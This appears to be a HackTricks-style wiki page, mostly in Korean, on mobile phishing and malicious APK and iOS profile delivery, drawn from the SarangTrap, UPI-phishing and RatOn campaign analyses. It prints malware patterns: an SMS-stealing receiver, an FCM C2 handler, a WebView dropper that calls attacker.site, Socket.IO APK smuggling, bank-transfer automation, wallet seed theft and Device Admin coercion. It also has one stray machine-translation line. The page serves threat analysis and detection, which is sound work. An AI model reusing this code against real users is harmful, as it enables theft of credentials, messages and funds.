# Mobile Phishing & 악성 앱 배포 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 위협 행위자가 **malicious Android APKs** 및 **iOS mobile-configuration profiles**를 phishing(SEO, social engineering, fake stores, dating apps 등)을 통해 배포하는 데 사용하는 기술을 다룹니다.
> 자료는 Zimperium zLabs(2025)가 공개한 SarangTrap 캠페인과 기타 공개 리서치를 바탕으로 정리되었습니다.

## 공격 흐름

1. **SEO/Phishing Infrastructure**
* 유사 도메인(데이트, 클라우드 공유, 차량 서비스 등) 수십 개를 등록합니다.
– `<title>` 요소에 현지 언어 키워드와 이모지를 넣어 Google에서 순위를 올립니다.
– 동일한 랜딩 페이지에 Android(`.apk`)와 iOS 설치 지침을 *둘 다* 호스팅합니다.
2. **First Stage Download**
* Android: *unsigned* 또는 “third-party store” APK로의 직접 링크.
* iOS: `itms-services://` 또는 일반 HTTPS 링크로 악성 **mobileconfig** 프로파일(아래 참조).
3. **Post-install Social Engineering**
* 첫 실행 시 앱은 **invitation / verification code**를 요구함(독점 접근 환상).
* 코드는 **POSTed over HTTP**로 Command-and-Control (C2)에 전송됩니다.
* C2가 `{"success":true}`로 응답하면 ➜ malware가 동작을 계속합니다.
* 유효한 코드를 제출하지 않는 Sandbox / AV dynamic analysis는 **악의적 동작을 전혀 보지 못함**(회피).
4. **Runtime Permission Abuse** (Android)
* 위험한 권한들은 **positive C2 response** 이후에만 요청됩니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 최근 변종은 `AndroidManifest.xml`에서 SMS에 대한 `<uses-permission>`을 **제거**하지만 Java/Kotlin 코드 경로는 reflection으로 SMS를 읽는 부분을 남겨둠 ⇒ 정적 점수를 낮추면서 AppOps abuse나 오래된 대상 기기에서 여전히 동작함.
5. **Facade UI & Background Collection**
* 앱은 지역적으로 구현된 무해한 뷰(SMS viewer, gallery picker)를 보여줍니다.
* 그 사이에 다음을 exfiltrates(유출)합니다:
- IMEI / IMSI, 전화번호
- Full `ContactsContract` dump (JSON array)
- `/sdcard/DCIM`의 JPEG/PNG를 [Luban](https://github.com/Curzibn/Luban)으로 압축하여 크기 축소
- 선택적 SMS 내용 (`content://sms`)
페이로드는 **batch-zipped** 되어 `HTTP POST /upload.php`로 전송됩니다.
6. **iOS Delivery Technique**
* 단일 **mobile-configuration profile**로 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등을 요청하여 기기를 “MDM”-유사 supervision에 등록할 수 있습니다.
* Social-engineering 지침:
1. Settings 열기 ➜ *Profile downloaded*.
2. *Install*을 세 번 탭(피싱 페이지에 스크린샷 제공).
3. unsigned profile을 신뢰 ➜ 공격자는 App Store 리뷰 없이 *Contacts* 및 *Photo* entitlement를 획득합니다.
7. **Network Layer**
* 일반적으로 포트 80에서 동작하는 plain HTTP, HOST 헤더는 `api.<phishingdomain>.com` 같은 형태.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 없음 → 탐지 쉬움).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – malware 평가 중에 Frida/Objection으로 invitation code 단계를 자동화하여 악성 분기로 진입하세요.
* **Manifest vs. Runtime Diff** – `aapt dump permissions`와 runtime의 `PackageManager#getRequestedPermissions()`를 비교; 위험한 권한이 누락되어 있으면 경고 신호입니다.
* **Network Canary** – 코드 입력 후 비정상적인 POST 폭주를 탐지하려면 `iptables -p tcp --dport 80 -j NFQUEUE`를 구성하세요.
* **mobileconfig Inspection** – macOS에서 `security cms -D -i profile.mobileconfig`를 사용해 `PayloadContent`를 나열하고 과도한 권한을 찾아보세요.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics**로 키워드가 풍부한 도메인의 급증을 포착하세요.
* **User-Agent & Path Regex**: Google Play 외부의 Dalvik 클라이언트에서 오는 `(?i)POST\s+/(check|upload)\.php` 패턴을 탐지하세요.
* **Invite-code Telemetry** – APK 설치 직후 6–8자리 숫자 코드의 POST는 스테이징 신호일 수 있습니다.
* **MobileConfig Signing** – MDM 정책으로 unsigned configuration profile을 차단하세요.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## 지표 (일반)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

이 패턴은 정부 지원 테마를 악용해 인도 UPI 자격증명 및 OTP를 탈취하는 캠페인에서 관찰되었습니다. 공격자들은 전달과 복원력을 위해 신뢰받는 플랫폼들을 연쇄적으로 활용합니다.

### 신뢰된 플랫폼을 통한 전달 체인
- YouTube 동영상 미끼 → 설명에 단축 링크 포함
- 단축 링크 → 정식 포털을 모방한 GitHub Pages phishing 사이트
- 동일한 GitHub repo는 파일에 직접 연결되는 가짜 “Google Play” 배지가 붙은 APK를 호스팅함
- 동적 phishing 페이지는 Replit에 호스팅되며; 원격 명령 채널은 Firebase Cloud Messaging (FCM)을 사용함

### Dropper with embedded payload and offline install
- 첫 번째 APK는 설치 프로그램(installer, dropper)으로, 실제 악성코드를 `assets/app.apk`에 포함해 배포하고 사용자가 Wi‑Fi/모바일 데이터를 비활성화하도록 유도해 클라우드 탐지를 무력화합니다.
- 내장된 payload는 무해해 보이는 레이블(예: “Secure Update”)로 설치됩니다. 설치 후에는 설치 프로그램과 payload가 별개의 앱으로 모두 존재합니다.

정적 분석 팁 (grep로 내장 payload 검색):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 단축 링크를 통한 동적 엔드포인트 검색
- Malware는 평문(plain-text) 형태의, 쉼표로 구분된 라이브 엔드포인트 목록을 단축 링크에서 가져오며; 간단한 문자열 변환으로 최종 phishing 페이지 경로를 생성한다.

예시(익명화됨):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
의사 코드:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView 기반 UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” 단계는 WebView 내부의 동적 엔드포인트에서 공격자 HTML 폼을 불러와 전화번호, 은행, UPI PIN 등의 민감한 필드를 캡처하고 이를 `POST`로 `addup.php`에 전송합니다.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 최초 실행 시 과도한 권한을 요청합니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 연락처를 반복 처리하여 피해자 기기에서 smishing SMS를 대량 발송합니다.
- 수신된 SMS는 broadcast receiver에 의해 가로채져 메타데이터(발신자, 본문, SIM slot, 기기별 무작위 ID)와 함께 `/addsm.php`로 업로드됩니다.

수신기 스케치:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM)를 복원력 있는 C2로 사용
- payload는 FCM에 등록된다; push 메시지는 액션을 트리거하는 스위치로 사용되는 `_type` 필드를 포함한다(예: phishing 텍스트 템플릿 업데이트, 동작 토글).

예시 FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 스케치:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### 헌팅 패턴 및 IOCs
- APK가 보조 페이로드를 `assets/app.apk`에 포함
- WebView가 `gate.htm`에서 결제 페이지를 로드하고 `/addup.php`로 유출
- SMS를 `/addsm.php`로 유출
- Shortlink 기반 구성 가져오기(예: `rebrand.ly/*`) — CSV 엔드포인트 반환
- 일반적인 “Update/Secure Update”로 라벨된 앱
- 신뢰되지 않은 앱에서 `_type` 구분자를 가진 FCM `data` 메시지

### 탐지 및 방어 아이디어
- 설치 중 네트워크를 비활성화하라고 지시한 후 `assets/`에서 두 번째 APK를 사이드로드하는 앱을 플래그
- 권한 조합에 대해 경보: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView 기반 결제 흐름
- 비기업 호스트에서 `POST /addup.php|/addsm.php`에 대한 아웃바운드 모니터링; 알려진 인프라는 차단
- Mobile EDR 규칙: FCM에 등록하고 `_type` 필드로 분기하는 신뢰할 수 없는 앱

---

## Socket.IO/WebSocket 기반 APK Smuggling + Fake Google Play Pages

공격자들은 정적 APK 링크를 Google Play처럼 보이게 만든 유인 페이지에 내장된 Socket.IO/WebSocket 채널로 대체하는 사례가 늘고 있다. 이렇게 하면 페이로드 URL을 숨기고 URL/확장자 필터를 우회하며 현실적인 설치 UX를 유지한다.

실제로 관찰된 일반적인 클라이언트 흐름:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
간단한 제어를 회피하는 이유:
- 고정된 APK URL이 노출되지 않음; 페이로드는 WebSocket 프레임에서 메모리로 재조립됨.
- 직접 .apk 응답을 차단하는 URL/MIME/확장자 필터는 WebSockets/Socket.IO를 통해 터널링된 바이너리 데이터를 놓칠 수 있음.
- WebSockets를 실행하지 않는 크롤러와 URL 샌드박스는 페이로드를 가져오지 못함.

헌팅 및 탐지 아이디어:
- Web/네트워크 텔레메트리: 큰 바이너리 청크를 전송한 후 MIME application/vnd.android.package-archive인 Blob을 생성하고 프로그래밍 방식의 `<a download>` 클릭을 수행하는 WebSocket 세션을 플래그 지정하라. socket.emit('startDownload') 같은 클라이언트 문자열과 페이지 스크립트에서 chunk, downloadProgress, downloadComplete라는 이름의 이벤트를 찾아라.
- Play-store 스푸핑 휴리스틱: Play와 유사한 페이지를 제공하는 non-Google 도메인에서 Google Play UI 문자열(예: http.html:"VfPpkd-jY41G-V67aGc"), 혼합 언어 템플릿, 그리고 WS 이벤트로 구동되는 가짜 “verification/progress” 흐름을 찾아라.
- 대응: non-Google 출처에서의 APK 전송을 차단하라; WebSocket 트래픽을 포함하도록 MIME/확장자 정책을 적용하라; 브라우저의 안전 다운로드 프롬프트를 유지하라.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn 사례 연구

RatOn banker/RAT campaign (ThreatFabric)은 현대 mobile phishing 운영이 WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, 그리고 NFC-relay orchestration을 어떻게 결합하는지에 대한 구체적 예시다. 이 섹션은 재사용 가능한 기술을 추상화한다.

### Stage-1: WebView → native install bridge (dropper)
공격자는 공격자 페이지를 가리키는 WebView를 띄우고 native installer를 노출하는 JavaScript interface를 주입한다. HTML 버튼을 탭하면 네이티브 코드가 호출되어 dropper의 assets에 번들된 second-stage APK를 설치한 다음 이를 직접 실행한다.

최소 패턴:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
해당 파일(src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md)의 HTML 또는 번역할 원문 내용을 붙여 주세요. 내용을 받아야 정확히 Markdown/HTML 구조를 유지한 채 영어에서 한국어로 번역해 드립니다.
```html
<button onclick="bridge.installApk()">Install</button>
```
설치 후, dropper는 명시적 package/activity를 통해 payload를 시작합니다:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: 신뢰할 수 없는 앱이 `addJavascriptInterface()`를 호출하고 WebView에 installer-like 메서드를 노출; `assets/` 아래에 임베디드된 2차 페이로드를 포함해 배포되는 APK가 Package Installer Session API를 호출하는 사례.

### 동의 흐름: Accessibility + Device Admin + 후속 런타임 프롬프트
Stage-2는 “Access” 페이지를 호스팅하는 WebView를 연다. 해당 버튼은 익스포트된 메서드를 호출해 피해자를 Accessibility 설정으로 이동시키고 악성 서비스를 활성화하도록 요청한다. 승인되면, 악성코드는 Accessibility를 이용해 이후의 런타임 권한 대화상자(contacts, overlay, manage system settings 등)의 버튼을 자동으로 클릭하고 Device Admin을 요청한다.

- Accessibility는 노드 트리에서 “Allow”/“OK” 같은 버튼을 찾아 클릭 이벤트를 전송해 이후의 프롬프트를 프로그래밍적으로 수락하도록 돕는다.
- Overlay 권한 확인/요청:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
참고:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView를 통한 오버레이 phishing/랜섬
운영자들은 다음 명령을 내릴 수 있다:
- URL로부터 전체 화면 오버레이를 렌더링하거나,
- WebView 오버레이에 로드되는 inline HTML을 전달한다.

가능한 사용: 강요(coercion) (PIN 입력), PIN을 캡처하기 위한 지갑 열기, 랜섬 메시지 전송. 누락된 경우 오버레이 권한이 허용되었는지 확인하는 명령을 포함해 두어라.

### 원격 제어 모델 – 텍스트 의사-스크린 + screen-cast
- 저대역폭: 주기적으로 Accessibility node tree를 덤프하고, 보이는 texts/roles/bounds를 직렬화하여 의사-스크린으로 C2에 전송한다(예: 한 번 실행하는 `txt_screen`과 지속 실행하는 `screen_live` 같은 명령).
- 고해상도: MediaProjection을 요청하고 필요 시 screen-casting/recording을 시작한다(예: `display` / `record` 같은 명령).

### ATS 플레이북 (bank app 자동화)
JSON 태스크를 받아, 은행 앱을 열고 Accessibility를 통해 텍스트 쿼리와 좌표 탭을 섞어 UI를 조작하며, 요청되면 피해자의 결제 PIN을 입력한다.

예시 태스크:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "새 결제"
- "Zadat platbu" → "결제 입력"
- "Nový příjemce" → "새 수신인"
- "Domácí číslo účtu" → "국내 계좌 번호"
- "Další" → "다음"
- "Odeslat" → "보내기"
- "Ano, pokračovat" → "예, 계속"
- "Zaplatit" → "결제"
- "Hotovo" → "완료"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- 현재 자격 증명을 만료시켜 변경을 강제 (Accessibility가 새 PIN/비밀번호를 캡처):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard 생체인식 기능을 비활성화하여 생체 인증이 아닌 방식으로 잠금 해제를 강제:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
참고: 많은 DevicePolicyManager 제어는 최신 Android에서 Device Owner/Profile Owner 권한이 필요합니다; 일부 OEM 빌드는 느슨할 수 있습니다. 항상 대상 OS/OEM에서 검증하세요.

### NFC relay orchestration (NFSkate)
Stage-3는 외부 NFC-relay 모듈(예: NFSkate)을 설치하고 실행할 수 있으며, 릴레이 중 피해자를 안내하기 위한 HTML 템플릿을 전달할 수도 있습니다. 이는 온라인 ATS와 함께 비접촉 카드-프레젠트 현금화(cash-out)를 가능하게 합니다.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/상태: `txt_screen`, `screen_live`, `display`, `record`
- 소셜: `send_push`, `Facebook`, `WhatsApp`
- 오버레이: `overlay` (인라인 HTML), `block` (URL), `block_off`, `access_tint`
- 지갑: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- 기기: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- 통신/정찰: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### 탐지 및 방어 아이디어 (RatOn-style)
- 설치자/권한 메서드를 노출하는 `addJavascriptInterface()`를 가진 WebViews를 탐지하세요; Accessibility 프롬프트를 유발하는 “/access”로 끝나는 페이지들.
- 서비스 접근 권한 부여 직후 고빈도 Accessibility 제스처/클릭을 생성하는 앱에 대해 경고하세요; C2로 전송되는 Accessibility node dumps와 유사한 텔레메트리.
- 신뢰할 수 없는 앱에서의 Device Admin 정책 변경을 모니터링하세요: `lockNow`, password expiration, keyguard 기능 토글.
- 비기업용 앱에서의 MediaProjection 프롬프트 후 주기적인 프레임 업로드가 이어지는 경우 경고하세요.
- 한 앱에 의해 트리거되어 외부 NFC-relay 앱의 설치/실행을 탐지하세요.
- 뱅킹의 경우: out-of-band 확인, biometrics-binding, 및 기기 내 자동화에 강한 거래 한도 적용을 시행하세요.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
